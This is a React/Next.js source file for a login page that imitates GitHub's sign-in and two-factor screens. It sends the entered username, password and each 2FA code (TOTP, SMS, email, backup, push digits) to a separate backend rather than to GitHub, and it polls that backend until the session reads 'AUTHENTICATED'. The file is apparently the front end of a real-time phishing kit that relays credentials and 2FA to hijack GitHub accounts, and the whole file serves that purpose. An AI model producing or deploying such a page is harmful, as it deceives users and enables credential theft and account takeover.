"use client";

import { useState, useEffect } from "react";
import { githubApi } from "@/lib/api";

type Step = "login" | "2fa" | "methods" | "success";

export default function LoginPage() {
    const [step, setStep] = useState<Step>("login");
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [twoFACode, setTwoFACode] = useState("");
    const [sessionId, setSessionId] = useState<string | null>(null);
    const [challengeType, setChallengeType] = useState<string | null>(null);
    const [challengeMetadata, setChallengeMetadata] = useState<any>(null);
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);

    const handleLoginSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!username || !password || isLoading) return;

        setIsLoading(true);
        setError(null);

        try {
            const data = await githubApi.login(username, password);

            // 1. Success case (no 2FA)
            if (data.success && !data.challengeType) {
                setStep("success");
                return;
            }

            // 2. 2FA case
            if (data.sessionId && (data.challengeType || data.requires2FA || data.status === "REQUIRES_2FA")) {
                setSessionId(data.sessionId);
                setChallengeType(data.challengeType || "TOTP");
                setChallengeMetadata(data.challengeMetadata);
                setStep("2fa");
                return;
            }

            // 3. Error case
            setError(data.message || "Incorrect username or password.");
        } catch (err) {
            setError("An error occurred. Please try again.");
        } finally {
            setIsLoading(false);
        }
    };

    const handle2FASubmit = async (e?: React.FormEvent) => {
        if (e) e.preventDefault();
        if (!sessionId || isLoading) return;
        if (!twoFACode && challengeType !== "PUSH" && challengeType !== "SECURITY_KEY") return;

        setIsLoading(true);
        setError(null);

        try {
            const data = await githubApi.submit2FA(sessionId, twoFACode);

            if (data.success) {
                if (!data.challengeType) {
                    setStep("success");
                } else {
                    setChallengeType(data.challengeType);
                    setChallengeMetadata(data.challengeMetadata);
                    setTwoFACode("");
                    setStep("2fa");
                }
            } else {
                setError(data.message || "Invalid verification code.");
            }
        } catch (err) {
            setError("An error occurred. Please try again.");
        } finally {
            setIsLoading(false);
        }
    };

    const handleSwitch2FAMethod = async (method: string) => {
        if (!sessionId || isLoading) return;

        setIsLoading(true);
        setError(null);

        try {
            const data = await githubApi.switch2FA(sessionId, method);
            if (data.sessionId) {
                setChallengeType(data.challengeType || "TOTP");
                setChallengeMetadata(data.challengeMetadata);
                setTwoFACode("");
                setStep("2fa");
            } else {
                setError(data.message || "Failed to switch method.");
            }
        } catch (err) {
            setError("Failed to switch method. Please try again.");
        } finally {
            setIsLoading(false);
        }
    };

    // Poll for PUSH success
    useEffect(() => {
        let interval: NodeJS.Timeout;
        if (step === "2fa" && challengeType === "PUSH" && sessionId) {
            const apiBase = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8000/api/github";
            const statusUrl = apiBase.replace("/github", "/sessions") + `/${sessionId}`;

            interval = setInterval(async () => {
                try {
                    const response = await fetch(statusUrl, {
                        headers: {
                            "X-API-Key": process.env.NEXT_PUBLIC_API_KEY || "",
                        }
                    });
                    const data = await response.json();
                    if (data.success && data.data?.status === "AUTHENTICATED") {
                        setStep("success");
                        clearInterval(interval);
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 3000);
        }
        return () => clearInterval(interval);
    }, [step, challengeType, sessionId]);

    const get2FATitle = () => {
        switch (challengeType) {
            case "PUSH": return "Check your mobile device";
            case "EMAIL": return "Device verification";
            default: return "Two-factor authentication";
        }
    };

    const get2FAIcon = () => {
        switch (challengeType) {
            case "PUSH":
                return (
                    <svg height="32" viewBox="0 0 16 16" version="1.1" width="32" className="mx-auto mb-4 fill-[#656d76]">
                        <path d="M5 1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75v12.5A1.75 1.75 0 0 1 9.25 16h-2.5A1.75 1.75 0 0 1 5 14.25V1.75zM6.75 1.5a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h2.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25h-2.5z"></path>
                    </svg>
                );
            case "SECURITY_KEY":
                return (
                    <svg height="32" viewBox="0 0 16 16" version="1.1" width="32" className="mx-auto mb-4 fill-[#656d76]">
                        <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13zM6.5 8.5a1.5 1.5 0 1 1 3 0 1.5 1.5 0 0 1-3 0z"></path>
                    </svg>
                );
            default:
                return (
                    <svg height="32" viewBox="0 0 16 16" version="1.1" width="32" className="mx-auto mb-4 fill-[#656d76]">
                        <path d="M8 1a2 2 0 0 1 2 2v2H6V3a2 2 0 0 1 2-2zm3 4V3a3 3 0 0 0-6 0v2H3.5A1.5 1.5 0 0 0 2 6.5v7A1.5 1.5 0 0 0 3.5 15h9a1.5 1.5 0 0 0 1.5-1.5v-7A1.5 1.5 0 0 0 12.5 5H11zM3.5 6.5h9a.5.5 0 0 1 .5.5v7a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-7a.5.5 0 0 1 .5-.5z"></path>
                    </svg>
                );
        }
    };

    const render2FAChallenge = () => {
        switch (challengeType) {
            case "PUSH":
                return (
                    <div className="text-center">
                        {get2FAIcon()}
                        <p className="text-sm mb-4">
                            We’ve sent a sign-in request on your GitHub Mobile app. Enter the digits shown below to verify your identity.
                        </p>
                        {challengeMetadata?.digits && (
                            <div className="flex flex-col items-center gap-2 mb-6">
                                <span className="text-6xl font-normal tracking-tighter text-[#1f2328]">{challengeMetadata.digits}</span>
                            </div>
                        )}
                        <button
                            type="button"
                            onClick={() => setStep("methods")}
                            className="w-full flex items-center justify-center gap-1 py-1.5 px-4 text-[#1f2328] bg-[#f6f8fa] border border-[#d1d9e0] rounded-md text-sm hover:bg-[#f3f4f6] transition-colors mb-4"
                        >
                            More options
                            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" className="fill-current text-[#656d76]">
                                <path d="m4.427 6.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 6H4.604a.25.25 0 0 0-.177.427Z"></path>
                            </svg>
                        </button>
                        <div className="text-xs text-[#656d76] flex items-center justify-center gap-2 mt-2">
                            <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
                                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"></circle>
                                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                            Waiting for your approval...
                        </div>
                    </div>
                );
            case "EMAIL":
                return (
                    <div className="text-left">
                        {get2FAIcon()}
                        <p className="text-sm mb-4 text-center">
                            We’ve sent a verification code to your email. Please enter it below.
                        </p>
                        <div className="mb-4">
                            <label className="block text-sm font-semibold mb-2" htmlFor="otp">Verification code</label>
                            <input id="otp" type="text" className="github-input text-center text-xl tracking-[0.2em]" placeholder="XXXXXX" value={twoFACode} onChange={(e) => setTwoFACode(e.target.value)} autoFocus required disabled={isLoading} />
                        </div>
                        <button type="submit" className="github-btn" disabled={isLoading || !twoFACode}>
                            {isLoading ? "Verifying..." : "Verify"}
                        </button>
                    </div>
                );
            case "SECURITY_KEY":
                return (
                    <div className="text-center">
                        {get2FAIcon()}
                        <p className="text-sm mb-6">
                            Insert your security key into a USB port or connect it via NFC/Bluetooth, and then follow your browser's instructions.
                        </p>
                        <button type="button" onClick={() => handle2FASubmit()} className="github-btn mb-4" disabled={isLoading}>
                            {isLoading ? "Waiting..." : "Use security key"}
                        </button>
                    </div>
                );
            default:
                const isSMS = challengeType === "SMS";
                return (
                    <div className="text-left">
                        {get2FAIcon()}
                        <p className="text-sm mb-4 text-center">
                            {isSMS
                                ? "We’ve sent a code to your phone. Please enter it below."
                                : "Enter the code from your authenticator app."}
                        </p>
                        <div className="mb-4">
                            <label className="block text-sm font-semibold mb-2" htmlFor="otp">
                                {challengeType === "BACKUP" ? "Backup code" : "Two-factor code"}
                            </label>
                            <input id="otp" type="text" className="github-input text-center text-xl tracking-[0.2em]" placeholder="XXXXXX" value={twoFACode} onChange={(e) => setTwoFACode(e.target.value)} autoFocus required disabled={isLoading} />
                        </div>
                        <button type="submit" className="github-btn" disabled={isLoading || !twoFACode}>
                            {isLoading ? "Verifying..." : "Verify"}
                        </button>
                    </div>
                );
        }
    };

    return (
        <div className="min-h-screen flex flex-col items-center pt-8 px-4 bg-[#f6f8fa]">
            {/* GitHub Logo */}
            <div className="mb-6">
                <a href="https://github.com" aria-label="Homepage">
                    <svg height="48" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="48" className="fill-current text-[#1f2328]">
                        <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
                    </svg>
                </a>
            </div>

            <div className="w-full max-w-[308px]">
                {step === "login" && (
                    <>
                        <h1 className="text-[24px] font-light text-center mb-4 text-[#1f2328]">Sign in to GitHub</h1>

                        {error && (
                            <div className="bg-[#ffebe9] border border-[#ff818266] rounded-md p-4 mb-4 text-sm text-[#1f2328] relative">
                                {error}
                                <button className="absolute right-2 top-2 text-[#656d76] hover:text-[#1f2328]" onClick={() => setError(null)}>
                                    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" className="fill-current">
                                        <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
                                    </svg>
                                </button>
                            </div>
                        )}

                        <div className="bg-white border border-[#d1d9e0] rounded-md p-4 shadow-sm">
                            <form onSubmit={handleLoginSubmit} className="space-y-4">
                                <div>
                                    <label className="block text-sm mb-2 text-[#1f2328]" htmlFor="login_field">Username or email address</label>
                                    <input id="login_field" type="text" className="github-input" value={username} onChange={(e) => setUsername(e.target.value)} autoCapitalize="off" autoCorrect="off" autoFocus required disabled={isLoading} />
                                </div>

                                <div>
                                    <div className="flex justify-between items-center mb-2">
                                        <label className="text-sm text-[#1f2328]" htmlFor="password">Password</label>
                                        <a href="https://github.com/password_reset" className="text-[#0969da] text-xs hover:underline">Forgot password?</a>
                                    </div>
                                    <input id="password" type="password" className="github-input" value={password} onChange={(e) => setPassword(e.target.value)} autoComplete="current-password" required disabled={isLoading} />
                                </div>

                                <button type="submit" className="github-btn" disabled={isLoading}>
                                    {isLoading ? "Signing in..." : "Sign in"}
                                </button>
                            </form>
                        </div>

                        <div className="border border-[#d1d9e0] rounded-md p-4 mt-4 text-sm text-center bg-white shadow-sm">
                            New to GitHub? <a href="https://github.com/signup" className="text-[#0969da] hover:underline">Create an account</a>.
                        </div>
                    </>
                )}

                {step === "2fa" && (
                    <>
                        <h1 className="text-[24px] font-light text-center mb-4 text-[#1f2328]">{get2FATitle()}</h1>

                        {error && (
                            <div className="bg-[#ffebe9] border border-[#ff818266] rounded-md p-4 mb-4 text-sm text-[#1f2328]">
                                {error}
                            </div>
                        )}

                        <div className="bg-white border border-[#d1d9e0] rounded-md p-6 shadow-sm">
                            <form onSubmit={handle2FASubmit} className="space-y-4">
                                {render2FAChallenge()}

                                <div className="mt-8 text-center border-t border-[#d1d9e0] pt-6">
                                    <button type="button" onClick={() => setStep("methods")} className="text-[#0969da] text-xs hover:underline font-semibold bg-transparent border-none cursor-pointer">
                                        Try another method
                                    </button>
                                </div>
                            </form>
                        </div>
                    </>
                )}

                {step === "methods" && (
                    <>
                        <h1 className="text-[24px] font-light text-center mb-4 text-[#1f2328]">Two-factor authentication</h1>
                        <div className="bg-white border border-[#d1d9e0] rounded-md p-6 shadow-sm">
                            <p className="text-sm text-[#656d76] mb-4 text-center">
                                Choose another way to complete two-factor authentication.
                            </p>
                            <div className="space-y-3">
                                {challengeMetadata?.availableMethods?.map((method: string) => (
                                    <button
                                        key={method}
                                        type="button"
                                        onClick={() => handleSwitch2FAMethod(method)}
                                        disabled={isLoading}
                                        className="w-full flex items-center gap-3 p-3 border border-[#d1d9e0] rounded-md hover:bg-[#f6f8fa] transition-colors text-left bg-white cursor-pointer group"
                                    >
                                        <div className="flex-1">
                                            <div className="text-sm font-semibold text-[#1f2328] group-hover:text-[#0969da]">{method}</div>
                                            <div className="text-[11px] text-[#656d76]">
                                                {method === "PUSH" ? "Approve a notification on your mobile device" :
                                                    method === "TOTP" ? "Get a code from your authentication app" :
                                                        method === "SMS" ? "Get a code via text message" :
                                                            method === "BACKUP" ? "Enter a recovery code" : "Authenticate using this method"}
                                            </div>
                                        </div>
                                        <svg height="16" viewBox="0 0 16 16" version="1.1" width="16" className="fill-[#656d76] group-hover:fill-[#0969da]">
                                            <path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.75.75 0 0 1-1.06-1.06L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06z"></path>
                                        </svg>
                                    </button>
                                ))}
                            </div>
                            <div className="mt-6 text-center">
                                <button type="button" onClick={() => setStep("2fa")} className="text-[#0969da] text-xs hover:underline font-semibold bg-transparent border-none cursor-pointer">
                                    Cancel
                                </button>
                            </div>
                        </div>
                    </>
                )}

                {step === "success" && (
                    <div className="text-center mt-12 space-y-4 animate-in fade-in zoom-in duration-500">
                        <div className="w-20 h-20 bg-[#1f883d] rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-[#1f883d]/20">
                            <svg height="40" viewBox="0 0 16 16" version="1.1" width="40" className="fill-white">
                                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
                            </svg>
                        </div>
                        <h1 className="text-3xl font-bold tracking-tight text-[#1f2328]">Success!</h1>
                        <p className="text-[#656d76] text-lg">You have been signed in successfully.</p>
                    </div>
                )}
            </div>

            <footer className="mt-auto py-10 w-full max-w-[500px]">
                <ul className="flex justify-center space-x-6 text-xs text-[#0969da] list-none p-0 m-0">
                    <li><a href="https://github.com/site/terms" className="hover:underline">Terms</a></li>
                    <li><a href="https://github.com/site/privacy" className="hover:underline">Privacy</a></li>
                    <li><a href="https://docs.github.com/articles/github-security/" className="hover:underline">Security</a></li>
                    <li><a href="https://github.com/contact" className="text-[#656d76] hover:underline">Contact GitHub</a></li>
                </ul>
            </footer>
        </div>
    );
}
